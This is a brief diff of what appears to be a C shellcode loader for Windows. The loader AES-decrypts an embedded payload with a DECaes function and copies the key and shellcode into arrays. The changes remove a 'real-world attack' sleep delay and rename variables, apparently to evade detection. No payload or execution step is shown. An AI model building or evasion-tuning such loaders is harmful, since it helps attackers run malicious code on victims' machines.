@@ -35,7 +35,7 @@ void DECaes(char* coolcode, DWORD coolcodeLen, char* key, DWORD keyLen) {
 
 
 int main() {
-    Sleep(2000);  // Sleep to mimic real-world attack time delay
+    
 
     unsigned char* AESkey;
     DWORD AESkeyLen;
@@ -47,7 +47,7 @@ int main() {
 
     // Print the AES key and shellcode for debugging (as hex)
      unsigned char keykum[AESkeyLen];
-    unsigned char codee[AESCodeLen];
+    unsigned char codkuma[AESCodeLen];
 
     // Copy the data into the arrays
     memcpy(keykum, AESkey, AESkeyLen);
